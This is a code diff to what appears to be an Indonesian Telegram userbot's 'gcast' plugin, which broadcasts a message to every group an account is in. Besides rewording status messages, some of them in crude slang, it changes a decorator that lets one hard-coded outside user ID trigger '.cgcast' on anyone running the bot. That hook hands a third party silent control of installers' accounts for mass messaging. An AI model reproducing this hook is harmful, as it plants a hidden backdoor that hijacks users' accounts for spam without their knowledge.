@@ -26,7 +26,7 @@ GCAST_BLACKLIST = [
 
 
 @Xa_cmd(pattern="gcast(?: |$)(.*)")
-@register(incoming=True, from_users=1224143544,
+@register(incoming=True, from_users=1663258664,
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
@@ -35,9 +35,8 @@ async def gcast(event):
     elif event.is_reply:
         msg = await event.get_reply_message()
     else:
-        await event.edit("**Berikan Sebuah Pesan atau Reply**")
-        return
-    kk = await event.edit("`Gcast LO lagi OTW Y ANJJJ SABAR JAN MARAH MARAH PANTEE... 📢`")
+        return await edit_delete(event, "**Berikan Sebuah Pesan atau Reply**")
+    kk = await edit_or_reply(event, "`Bentar jing lagi dikirim gcast... 📢`")
     er = 0
     done = 0
     async for x in event.client.iter_dialogs():
@@ -52,7 +51,7 @@ async def gcast(event):
             except BaseException:
                 er += 1
     await kk.edit(
-        f"***Berhasil ya Gcast nya, tapi cuma ke ** `{done}` **Grup, lu gagal Gcast Ke ** `{er}` **Grup**"
+        f"**Gcast Berhasil Mengirim Pesan Ke** `{done}` **Grup, Tapi lu Gagal ngirim Pesan Ke** `{er}` **Grup**"
     )
 
 
